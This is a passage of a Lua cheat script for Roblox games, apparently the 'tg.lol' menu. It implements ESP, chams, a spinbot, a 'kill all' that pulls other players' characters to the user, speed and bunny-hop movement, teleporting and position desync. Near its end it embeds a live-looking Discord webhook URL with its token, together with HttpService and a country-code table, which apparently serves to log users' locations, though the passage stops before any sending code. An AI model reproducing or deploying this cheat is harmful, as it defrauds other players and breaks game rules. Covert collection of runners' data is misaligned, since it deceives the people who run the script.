FieldOfViewBox:AddToggle('FieldOfViewVisible', {
    Text = 'Visible',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        Environment.FOVSettings.Visible = Value
    end
})

FieldOfViewBox:AddSlider('FOVRadius', {
    Text = 'Size',
    Default = 80,
    Min = 0,
    Max = 800,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        Environment.FOVSettings.Amount = Value
    end
})

local SpinbotSection = Tabs.Combat:AddLeftGroupbox('Spinbot')

local spinbotEnabled = false
local rotationAnglePerFrame, rotationSmoothing = 0, 0.5

local runService = game:GetService("RunService")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

local function updateSpinbot()
    local humanoidRootPart = localPlayer.Character:WaitForChild("HumanoidRootPart")
    runService.RenderStepped:Connect(function()
        if spinbotEnabled then
            local targetRotation = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(rotationAnglePerFrame), 0)
            humanoidRootPart.CFrame = humanoidRootPart.CFrame:Lerp(targetRotation, rotationSmoothing)
        end
    end)
end

localPlayer.CharacterAdded:Connect(function(character)
    character:WaitForChild("Humanoid").AutoRotate = not spinbotEnabled
    updateSpinbot()
end)

SpinbotSection:AddToggle('SpinbotToggle', {
    Text = 'Enabled',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        spinbotEnabled = Value
        if localPlayer.Character then
            localPlayer.Character.Humanoid.AutoRotate = not Value
            updateSpinbot()
        end
    end
})

SpinbotSection:AddSlider('SpinbotSpeed', {
    Text = 'Speed',
    Default = 0,
    Min = 0,
    Max = 50,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        rotationAnglePerFrame = Value
    end
})

local KillAll = false
local teamCheck = false
local distanceInFront = 1

local function KillAllFunction()
    if KillAll then
        local localPlayer = game.Players.LocalPlayer
        if localPlayer then
            local localCharacter = localPlayer.Character
            local localTeam = localPlayer.Team

            if localCharacter then
                local localRootPart = localCharacter:FindFirstChild("HumanoidRootPart")

                if localRootPart then
                    for _, player in pairs(game.Players:GetPlayers()) do
                        if player ~= localPlayer and (not teamCheck or player.Team ~= localTeam) then
                            local character = player.Character
                            if character then
                                local rootPart = character:FindFirstChild("HumanoidRootPart")
                                if rootPart then
                                    local newPosition = localRootPart.CFrame * CFrame.new(0, 0, -distanceInFront)
                                    rootPart.CFrame = CFrame.new(newPosition.Position, localRootPart.Position)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end

local KillAllBox = Tabs.Combat:AddRightGroupbox('Kill all')

KillAllBox:AddToggle('KillAllToggle', {
    Text = 'Enabled',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        KillAll = Value
        if KillAll then
            game:GetService("RunService").RenderStepped:Connect(KillAllFunction)
        end
    end
})

KillAllBox:AddToggle('KillAllTeamCheckToggle', {
    Text = 'Team Check',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        teamCheck = Value
    end
})

KillAllBox:AddSlider('KillAllDistance', {
    Text = 'Distance',
    Default = 10,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        distanceInFront= Value
    end
})

local ESPBox = Tabs.Visuals:AddLeftGroupbox('ESP')

ESPBox:AddToggle('ESPMasterSwitch', {
    Text = 'Enabled',
    Default = false,
    Tooltip = 'Acts as a master switch.',
    Callback = function(Value)
        ESP_SETTINGS.Enabled = Value
    end
})

ESPBox:AddToggle('BoxToggle', {
    Text = 'Box',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowBox = Value
    end
}):AddColorPicker('BoxColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Box Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.BoxColor = Value
    end
})

ESPBox:AddToggle('NameToggle', {
    Text = 'Name',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowName = Value
    end
}):AddColorPicker('NameColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Name Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.NameColor = Value
    end
})

ESPBox:AddToggle('DistanceToggle', {
    Text = 'Distance',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowDistance = Value
    end
}):AddColorPicker('DistanceColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Distance Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.DistanceColor = Value
    end
})

ESPBox:AddToggle('ToolsToggle', {
    Text = 'Tools',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowTool = Value
    end
}):AddColorPicker('ToolColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Tool Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.ToolESPColor = Value
    end
})

ESPBox:AddToggle('TracerToggle', {
    Text = 'Tracers',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowTracer = Value
    end
}):AddColorPicker('TracerColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Tracer Color',
    Transparency = nil,
    Callback = function(Value)
        getgenv().crosshair.color = Value
    end
})

ESPBox:AddToggle('PredictionToggle', {
    Text = 'Prediction',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowViewDirection = Value
    end
}):AddColorPicker('PredictionColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Prediction Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.TracerColor = Value
    end
})

ESPBox:AddToggle('HealthToggle', {
    Text = 'Health',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ESP_SETTINGS.ShowHealth = Value
    end
}):AddColorPicker('HealthLowColorPicker', {
    Default = Color3.fromRGB(63, 36, 85),
    Title = 'Low Health Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.HealthLowColor = Value
    end
}):AddColorPicker('HealthHighColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'High Health Color',
    Transparency = nil,
    Callback = function(Value)
        ESP_SETTINGS.HealthHighColor = Value
    end
})

ESPBox:AddToggle('ChamsToggle', {
    Text = 'Chams',
    Default = false,
    Tooltip = 'Enables Chams',
    Callback = function(Value)
        ChamsEnabled = Value
        for _, highlight in ipairs(playerFolder:GetChildren()) do
            if highlight:IsA("Highlight") then
                highlight.Enabled = ChamsEnabled and ESP_SETTINGS.Enabled
            else 
                highlight.Enabled = false
            end
        end
    end
}):AddColorPicker('ChamsColorNTransparency', {
    Default = Color3.new(0, 0.70, 1),
    Title = 'Chams Color',
    Transparency = 0.5,
    Callback = function(Value, Transparency)
        ChamsHighlight.FillColor = Value
        ChamsHighlight.FillTransparency = Transparency
        for _, highlight in ipairs(playerFolder:GetChildren()) do
            if highlight:IsA("Highlight") then
                highlight.FillColor = Value
                highlight.FillTransparency = Transparency
            end
        end
    end
}):AddColorPicker('ChamsOutlineColorNTransparency', {
    Default = Color3.new(0, 0.70, 1),
    Title = 'Chams Outline Color',
    Transparency = 0,
    Callback = function(Value, Transparency)
        ChamsHighlight.OutlineColor = Value
        ChamsHighlight.OutlineTransparency = Transparency
        for _, highlight in ipairs(playerFolder:GetChildren()) do
            if highlight:IsA("Highlight") then
                highlight.OutlineColor = Value
                highlight.OutlineTransparency = Transparency
            end
        end
    end
})

Options.ChamsColorNTransparency:SetValueRGB(Color3.fromRGB(126, 72, 163))
Options.ChamsOutlineColorNTransparency:SetValueRGB(Color3.fromRGB(126, 72, 163))

Options.ChamsColorNTransparency.Transparency = 0.5
Options.ChamsOutlineColorNTransparency.Transparency = 0

Options.ChamsColorNTransparency:OnChanged(function()
    local Value = Options.ChamsColorNTransparency.Value
    local Transparency = Options.ChamsColorNTransparency.Transparency
    ChamsHighlight.FillColor = Value
    ChamsHighlight.FillTransparency = Transparency
    for _, highlight in ipairs(playerFolder:GetChildren()) do
        if highlight:IsA("Highlight") then
            highlight.FillColor = Value
            highlight.FillTransparency = Transparency
        end
    end
end)

Options.ChamsOutlineColorNTransparency:OnChanged(function()
    local Value = Options.ChamsOutlineColorNTransparency.Value
    local Transparency = Options.ChamsOutlineColorNTransparency.Transparency
    ChamsHighlight.OutlineColor = Value
    ChamsHighlight.OutlineTransparency = Transparency
    for _, highlight in ipairs(playerFolder:GetChildren()) do
        if highlight:IsA("Highlight") then
            highlight.OutlineColor = Value
            highlight.OutlineTransparency = Transparency
        end
    end
end)

ESPBox:AddLabel('Checks')

ESPBox:AddToggle('ESPInvisibleCheck', {
    Text = 'Invisible',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ChamsInvisCheck = Value
        ESP_SETTINGS.InvisCheck = Value
    end
})

ESPBox:AddToggle('ESPAliveCheck', {
    Text = 'Alive',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ChamsAliveCheck = Value
        ESP_SETTINGS.AliveCheck = Value
    end
})

ESPBox:AddToggle('ESPTeamCheck', {
    Text = 'Team',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        ChamsTeamCheck = Value
        ESP_SETTINGS.TeamCheck = Value
    end
})

local CrosshairBox = Tabs.Visuals:AddRightGroupbox('Crosshair')

CrosshairBox:AddToggle('CrosshairToggle', {
    Text = 'Enabled',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        getgenv().crosshair.enabled = Value
    end
})

CrosshairBox:AddLabel('Color'):AddColorPicker('CrosshairColorPicker', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Crosshair Color',
    Transparency = nil,
    Callback = function(Value)
        getgenv().crosshair.color = Value
    end
})

CrosshairBox:AddSlider('CrosshairWidth', {
    Text = 'Width',
    Default = 2.5,
    Min = 0,
    Max = 20,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.width = Value
    end
})

CrosshairBox:AddSlider('CrosshairRadius', {
    Text = 'Radius',
    Default = 11,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.radius = Value
    end
})

CrosshairBox:AddSlider('CrosshairLength', {
    Text = 'Length',
    Default = 25,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.length = Value
    end
})

CrosshairBox:AddToggle('CrosshairSpinToggle', {
    Text = 'Spin',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        getgenv().crosshair.spin = Value
    end
})

CrosshairBox:AddSlider('CrosshairSpinSpeed', {
    Text = 'Speed',
    Default = 150,
    Min = 0,
    Max = 600,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.spin_speed = Value
    end
})

CrosshairBox:AddSlider('CrosshairMaxSpinAngle', {
    Text = 'Max',
    Default = 360,
    Min = 0,
    Max = 360,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.spin_max = Value
    end
})

CrosshairBox:AddDropdown('CrosshairSpinStyle', {
    Values = {'Linear', 'Sine', 'Back', 'Quad', 'Quart', 'Quint', 'Bounce', 'Elastic', 'Exponential', 'Circular', 'Cubic'},
    Default = 1,
    Multi = false,
    Text = 'Spin Style',
    Tooltip = nil,
    Callback = function(Value)
        getgenv().crosshair.spin_style = Enum.EasingStyle[Value]
    end
})

CrosshairBox:AddToggle('CrosshairResizeToggle', {
    Text = 'Resize',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        getgenv().crosshair.resize = Value
    end
})

CrosshairBox:AddSlider('CrosshairResizeSpeed', {
    Text = 'Speed',
    Default = 150,
    Min = 0,
    Max = 600,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.resize_speed = Value
    end
})

CrosshairBox:AddSlider('CrosshairResizeMinSize', {
    Text = 'Min',
    Default = 5,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.resize_min = Value
    end
})

CrosshairBox:AddSlider('CrosshairResizeMaxSize', {
    Text = 'Max',
    Default = 25,
    Min = 0,
    Max = 100,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().crosshair.resize_max = Value
    end
})

if game.PlaceId == 4888256398 or game.PlaceId == 17227761001 or game.PlaceId == 15247475957 then

    local SkinsBox = Tabs.Visuals:AddLeftGroupbox('Skins')

    local skinsFolder = game:GetService("ReplicatedStorage").Models.Weapons
    local skins = skinsFolder["Glock 19"]
    local modifiedNames = {}

    for _, child in pairs(skins:GetChildren()) do
        local originalName = child.Name
        if string.sub(originalName, 1, string.len("Glock 19_")) == "Glock 19_" then
            local newName = string.sub(originalName, string.len("Glock 19_") + 1)
            table.insert(modifiedNames, newName)
        end
    end

    table.sort(modifiedNames)

    SkinsBox:AddDropdown('SelectedSkin', {
        Values = modifiedNames,
        Default = 1,
        Multi = false,
        Text = nil,
        Tooltip = nil,
        Callback = function(Value)
            game.Players.LocalPlayer:SetAttribute("EquippedSkin", Value)
        end
    })

    SkinsBox:AddDropdown('HitSound', {
        Values = {'Default', 'Rust', 'Gamesense', 'XP'},
        Default = 1,
        Multi = false,
        Text = "Hitsound",
        Tooltip = nil,
        Callback = function(Value)
            if Value == 'XP' then
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.SoundId = "rbxassetid://5857559198"
            elseif Value == 'Gamesense' then
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.SoundId = "rbxassetid://4753603610"
            elseif Value == 'Rust' then
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.SoundId = "rbxassetid://5043539486"
            elseif Value == "Default" then
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.SoundId = "rbxassetid://13744350422"
            end
            if Value == 'Gamesense' then
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.Volume = 6
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.TimePosition = 0.13
            else
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.Volume = 1.2
                game:GetService("ReplicatedStorage").FX.Sounds.BodyHit.TimePosition = 0
            end
        end
    })

end

local WorldVisuals = Tabs.Visuals:AddLeftGroupbox('World Visuals')

local ChangeAtmos = false
local customAmbient = Color3.fromRGB(126, 72, 163)

local customFogStart = 10
local customFogEnd = 200
local customFogColor = Color3.fromRGB(126, 72, 163)

local normalAmbient = game.Lighting.Ambient
local normalFogStart = game.Lighting.FogStart
local normalFogEnd = game.Lighting.FogEnd
local normalFogColor = game.Lighting.FogColor

local function changeAtmosphere(enable)
    if enable then
        game.Lighting.Ambient = customAmbient
        game.Lighting.FogStart = customFogStart
        game.Lighting.FogEnd = customFogEnd
        game.Lighting.FogColor = customFogColor
    else
        game.Lighting.Ambient = normalAmbient
        game.Lighting.FogStart = normalFogStart
        game.Lighting.FogEnd = normalFogEnd
        game.Lighting.FogColor = normalFogColor
    end
end

local function monitorAtmosphere()
    local lastChangeAtmos = ChangeAtmos
    game:GetService("RunService").RenderStepped:Connect(function()
        if ChangeAtmos ~= lastChangeAtmos then
            changeAtmosphere(ChangeAtmos)
            lastChangeAtmos = ChangeAtmos
        end
    end)
end

monitorAtmosphere()

WorldVisuals:AddToggle('AliveCheckESP', {
    Text = 'Enabled',
    Default = false,
    Tooltip = "Let's you change the world visuals",
    Callback = function(Value)
        ChangeAtmos = Value
        changeAtmosphere(ChangeAtmos)
    end
}):AddColorPicker('Ambient Color', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Ambient Color',
    Transparency = 0,
    Callback = function(Value)
        customAmbient = Value
        if ChangeAtmos then
            game.Lighting.Ambient = customAmbient
        end
    end
}):AddColorPicker('Fog Color', {
    Default = Color3.fromRGB(126, 72, 163),
    Title = 'Fog Color',
    Transparency = 0,
    Callback = function(Value)
        customFogColor = Value
        if ChangeAtmos then
            game.Lighting.FogColor = customFogColor
        end
    end
})

WorldVisuals:AddSlider('FogStart', {
    Text = 'Fog Start',
    Default = 1,
    Min = 1,
    Max = 10000,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        customFogStart = Value
        if ChangeAtmos then
            game.Lighting.FogStart = customFogStart
        end
    end
})

WorldVisuals:AddSlider('FogEnd', {
    Text = 'Fog End',
    Default = 200,
    Min = 1,
    Max = 10000,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        customFogEnd = Value
        if ChangeAtmos then
            game.Lighting.FogEnd = customFogEnd
        end
    end
})

local MovementSection = Tabs.Player:AddRightGroupbox('Character')

getgenv().cframe = true
getgenv().cfrene = false
getgenv().Multiplier = 0

local function onKeyPress(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == getgenv().ToggleKey then
        getgenv().cfrene = not getgenv().cfrene
    end
end

local function moveCharacter()
    while true do
        RunService.Stepped:wait()
        if getgenv().cframe and getgenv().cfrene then
            local character = LocalPlayer.Character
            if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Humanoid") then
                character.HumanoidRootPart.CFrame = character.HumanoidRootPart.CFrame + character.Humanoid.MoveDirection * getgenv().Multiplier
            end
        end
    end
end

UserInputService.InputBegan:Connect(onKeyPress)

coroutine.wrap(moveCharacter)()

getgenv().bhopEnabled = false

local function bhop()
    if getgenv().bhopEnabled then
        local character = LocalPlayer.Character
        if character and character:FindFirstChild("Humanoid") then
            local humanoid = character.Humanoid
            if humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end

RunService.RenderStepped:Connect(bhop)

MovementSection:AddToggle('BhopToggle', {
    Text = 'Bunny Hop',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        getgenv().bhopEnabled = Value
    end
}):AddKeyPicker('BhopKeybind', {
    Default = '',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'Bhop',
    NoUI = false, 
    Callback = function(Value)
    end,
    ChangedCallback = function(v)
        getgenv().bhopEnabled = v
    end
})

MovementSection:AddToggle('CFrameToggle', {
    Text = 'CFrame',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        if Value == false then
            getgenv().cfrene = false
        else 
            getgenv().cfrene = true
        end
    end
}):AddKeyPicker('CFrameKeybind', {
    Default = '',
    SyncToggleState = true,
    Mode = 'Toggle',
    Text = 'CFrame Walk',
    NoUI = false, 
    Callback = function(Value)
    end,
    ChangedCallback = function(New)
        getgenv().cfrene = New
    end
})

MovementSection:AddSlider('CFrameWalkSpeed', {
    Text = 'Speed',
    Default = 0,
    Min = 0,
    Max = 10,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        getgenv().Multiplier = Value
    end
})

local PlayerSection = Tabs.Player:AddRightGroupbox('Players')

PlayerSection:AddDropdown('PlayerList', {
    SpecialType = 'Player',
    Text = nil,
    Tooltip = nil,
    Callback = function(Value)
    end
})

PlayerSection:AddButton({
    Text = 'Whitelist',
    Func = function()
        local selectedPlayerName = Options.PlayerList.Value       
        if not selectedPlayerName or selectedPlayerName == "" then
            return
        end

        if not table.find(ESP_SETTINGS.WhitelistedPlayers, selectedPlayerName) then
            table.insert(ESP_SETTINGS.WhitelistedPlayers, selectedPlayerName)
        else
        end

        if not table.find(Environment.Settings.WhitelistedPlayers, selectedPlayerName) then
            table.insert(Environment.Settings.WhitelistedPlayers, selectedPlayerName)
        else
        end
    end,
    DoubleClick = false,
    Tooltip = nil
})

PlayerSection:AddButton({
    Text = 'Unwhitelist',
    Func = function()
        local selectedPlayerName = Options.PlayerList.Value       
        if not selectedPlayerName or selectedPlayerName == "" then
            return
        end

        local espIndex = table.find(ESP_SETTINGS.WhitelistedPlayers, selectedPlayerName)
        if espIndex then
            table.remove(ESP_SETTINGS.WhitelistedPlayers, espIndex)
        else
        end

        local aimbotIndex = table.find(Environment.Settings.WhitelistedPlayers, selectedPlayerName)
        if aimbotIndex then
            table.remove(Environment.Settings.WhitelistedPlayers, aimbotIndex)
        else
        end
    end,
    DoubleClick = false,
    Tooltip = nil
})

local Players = game:GetService("Players")
local camera = workspace.CurrentCamera

local selectedPlayer = nil
local isSpectating = false

local function StartSpectating(playerName)
    local player = Players:FindFirstChild(playerName)
    if player and player.Character and player.Character:FindFirstChild("Humanoid") then
        selectedPlayer = player
        isSpectating = true
        camera.CameraSubject = player.Character.Humanoid
    else
    end
end

local function StopSpectating()
    isSpectating = false
    selectedPlayer = nil
    if Players.LocalPlayer and Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
        camera.CameraSubject = Players.LocalPlayer.Character.Humanoid
    end
end

PlayerSection:AddButton({
    Text = 'Spectate',
    Func = function()
        local selectedPlayerName = Options.PlayerList.Value       
        if not selectedPlayerName or selectedPlayerName == "" then
            return
        end
        StartSpectating(selectedPlayerName)
    end,
    DoubleClick = false,
    Tooltip = nil
})

PlayerSection:AddButton({
    Text = 'Stop Spectating',
    Func = function()
        StopSpectating()
    end,
    DoubleClick = false,
    Tooltip = nil
})  

RunService.RenderStepped:Connect(function()
    if isSpectating and selectedPlayer and selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Humanoid") then
        camera.CameraSubject = selectedPlayer.Character.Humanoid
    end
end)


local function teleport(playerName)
    local player = Players:FindFirstChild(playerName)
    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        local localPlayer = Players.LocalPlayer
        if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
            localPlayer.Character:SetPrimaryPartCFrame(player.Character.HumanoidRootPart.CFrame)
        else
        end
    else
    end
end

PlayerSection:AddButton({
    Text = 'Teleport',
    Func = function()
        local selectedPlayerName = Options.PlayerList.Value       
        if not selectedPlayerName or selectedPlayerName == "" then
            return
        end
        teleport(selectedPlayerName)
    end,
    DoubleClick = false,
    Tooltip = nil
})

local AntiAim = Tabs.Player:AddLeftGroupbox('C-Desync')

local cframetpdesync = false
local cframetpdesynctype = ""
local cameraToggle = false

local customcframetpx = 0
local customcframetpy = 0
local customcframetpz = 0

local desync_stuff = {}

local lplr = game.Players.LocalPlayer
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local camera = game.Workspace.CurrentCamera

game:GetService("RunService").Heartbeat:Connect(function()
    if cframetpdesync then
        if lplr.Character and lplr.Character:FindFirstChild("HumanoidRootPart") then
            desync_stuff[1] = lplr.Character.HumanoidRootPart.CFrame
            local fakeCFrame = lplr.Character.HumanoidRootPart.CFrame
            local offsetX, offsetY, offsetZ = 0, 0, 0
            if cframetpdesynctype == "Nothing" then
            elseif cframetpdesynctype == "Teleport Desync" then
                fakeCFrame = fakeCFrame * CFrame.new(customcframetpx, customcframetpy, customcframetpz)
                offsetX = -customcframetpx
                offsetY = -customcframetpy
                offsetZ = -customcframetpz
            elseif cframetpdesynctype == "Random Desync" then
                local randomOffsetX = math.random(-50, 50)
                local randomOffsetY = math.random(-50, 50)
                local randomOffsetZ = math.random(-50, 50)
                fakeCFrame = fakeCFrame * CFrame.new(randomOffsetX, randomOffsetY, randomOffsetZ)
                offsetX = -randomOffsetX
                offsetY = -randomOffsetY
                offsetZ = -randomOffsetZ
            end

            lplr.Character.HumanoidRootPart.CFrame = fakeCFrame

            lplr.Character.Humanoid.CameraOffset = Vector3.new(offsetX, offsetY, offsetZ)

            game:GetService("RunService").RenderStepped:Wait()

            lplr.Character.HumanoidRootPart.CFrame = desync_stuff[1]

            lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)

        else
        end
    end
end)

local function updateCamera()
    if not cameraToggle then
        if player.Character.Humanoid then
            player.Character.Humanoid.CameraOffset = Vector3.new(0, 0, 0)
        else
        end
    end
end

local function onCharacterAdded(newCharacter)
    character = newCharacter
    updateCamera()
end

player.CharacterAdded:Connect(onCharacterAdded)

if cameraToggle then
    game:GetService("RunService").RenderStepped:Connect(updateCamera)
end

AntiAim:AddToggle('DesyncToggle', {
    Text = 'Enabled',
    Default = false,
    Tooltip = nil,
    Callback = function(Value)
        cframetpdesync = Value
        cameraToggle = Value
    end
})

AntiAim:AddDropdown('DesyncType', {
    Values = {'Nothing', 'Teleport Desync', 'Random Desync'},
    Default = 1,
    Multi = false, 
    Text = 'Type',
    Tooltip = nil,
    Callback = function(Value)
        cframetpdesynctype = Value
    end
})

AntiAim:AddSlider('DesyncX', {
    Text = 'X',
    Default = 0,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        customcframetpx = Value
    end
})

AntiAim:AddSlider('DesyncY', {
    Text = 'Y',
    Default = 0,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
        customcframetpy = Value
    end
})

AntiAim:AddSlider('DesyncZ', {
    Text = 'Z',
    Default = 0,
    Min = -50,
    Max = 50,
    Rounding = 1,
    Compact = false,
    Callback = function(Value)
       endcustomcframetpx = Value
    end
})

Library:SetWatermarkVisibility(false)

local FrameTimer = tick()
local FrameCounter = 0;
local FPS = 60;

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

    Library:SetWatermark(('tg.lol | private | %s fps | %s ms'):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ));
end);

Library.KeybindFrame.Visible = false;

Library:OnUnload(function()
    WatermarkConnection:Disconnect()
    Library.Unloaded = true
end)

local MenuGroup = Tabs['UI Settings']:AddLeftGroupbox('Menu')

MenuGroup:AddToggle('MenuKeybinds', {
    Text = 'Keybinds',
    Default = false, 
    Tooltip = nil,
    Callback = function(Value)
        Library.KeybindFrame.Visible = Value;
    end
})

MenuGroup:AddButton('Unload', function() Library:Unload() end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'End', NoUI = true, Text = 'Menu keybind' })

Library.ToggleKeybind = Options.MenuKeybind
ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })
SaveManager:BuildConfigSection(Tabs['UI Settings'])
SaveManager:SetFolder('tg.lol')
ThemeManager:ApplyToTab(Tabs['UI Settings'])
SaveManager:LoadAutoloadConfig()

local url = "https://canary.discord.com/api/webhooks/1273043244581650504/rRYlL8cZ6PWCAwvqqjm9uisTuLVWMygrjNM44CXWBDEY6T0PE2Y_A-Mng8ASOjvK8u43"

local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer

local countryCodes = {
    ["AD"] = "Andorra",
    ["AE"] = "United Arab Emirates",
    ["AF"] = "Afghanistan",
    ["AG"] = "Antigua and Barbuda",
    ["AI"] = "Anguilla",
    ["AL"] = "Albania",
    ["AM"] = "Armenia",
    ["AO"] = "Angola",
    ["AR"] = "Argentina",
    ["AS"] = "American Samoa",
    ["AT"] = "Austria",
    ["AU"] = "Australia",
    ["AW"] = "Aruba",
    ["AX"] = "Åland Islands",
    ["AZ"] = "Azerbaijan",
    ["BA"] = "Bosnia and Herzegovina",
    ["BB"] = "Barbados",
    ["BD"] = "Bangladesh",
    ["BE"] = "Belgium",
    ["BF"] = "Burkina Faso",
    ["BG"] = "Bulgaria",
    ["BH"] = "Bahrain",
    ["BI"] = "Burundi",
    ["BJ"] = "Benin",
    ["BL"] = "Saint Barthélemy",
    ["BM"] = "Bermuda",
    ["BN"] = "Brunei Darussalam",
    ["BO"] = "Bolivia",
    ["BQ"] = "Bonaire, Sint Eustatius and Saba",
    ["BR"] = "Brazil",
    ["BS"] = "Bahamas",
    ["BT"] = "Bhutan",
    ["BV"] = "Bouvet Island",
    ["BW"] = "Botswana",
    ["BY"] = "Belarus",
    ["BZ"] = "Belize",
    ["CA"] = "Canada",
    ["CC"] = "Cocos (Keeling) Islands",
    ["CD"] = "Congo, Democratic Republic of the",
    ["CF"] = "Central African Republic",
    ["CG"] = "Congo",
    ["CH"] = "Switzerland",
    ["CI"] = "Côte d'Ivoire",
    ["CK"] = "Cook Islands",
    ["CL"] = "Chile",
    ["CM"] = "Cameroon",
    ["CN"] = "China",
    ["CO"] = "Colombia",
    ["CR"] = "Costa Rica",
    ["CU"] = "Cuba",
    ["CV"] = "Cabo Verde",
    ["CW"] = "Curaçao",
    ["CX"] = "Christmas Island",
    ["CY"] = "Cyprus",
    ["CZ"] = "Czechia",
    ["DE"] = "Germany",
    ["DJ"] = "Djibouti",
    ["DK"] = "Denmark",
    ["DM"] = "Dominica",
    ["DO"] = "Dominican Republic",
    ["DZ"] = "Algeria",
    ["EC"] = "Ecuador",
    ["EE"] = "Estonia",
    ["EG"] = "Egypt",
    ["EH"] = "Western Sahara",
    ["ER"] = "Eritrea",
    ["ES"] = "Spain",
    ["ET"] = "Ethiopia",
    ["FI"] = "Finland",
    ["FJ"] = "Fiji",
    ["FM"] = "Micronesia (Federated States of)",
    ["FO"] = "Faroe Islands",
    ["FR"] = "France",
    ["GA"] = "Gabon",
    ["GB"] = "United Kingdom",
    ["GD"] = "Grenada",
    ["GE"] = "Georgia",
    ["GF"] = "French Guiana",
    ["GG"] = "Guernsey",
    ["GH"] = "Ghana",
    ["GI"] = "Gibraltar",
    ["GL"] = "Greenland",
    ["GM"] = "Gambia",
    ["GN"] = "Guinea",
    ["GP"] = "Guadeloupe",
    ["GQ"] = "Equatorial Guinea",
    ["GR"] = "Greece",
    ["GT"] = "Guatemala",
    ["GU"] = "Guam",
    ["GW"] = "Guinea-Bissau",
    ["GY"] = "Guyana",
    ["HK"] = "Hong Kong",
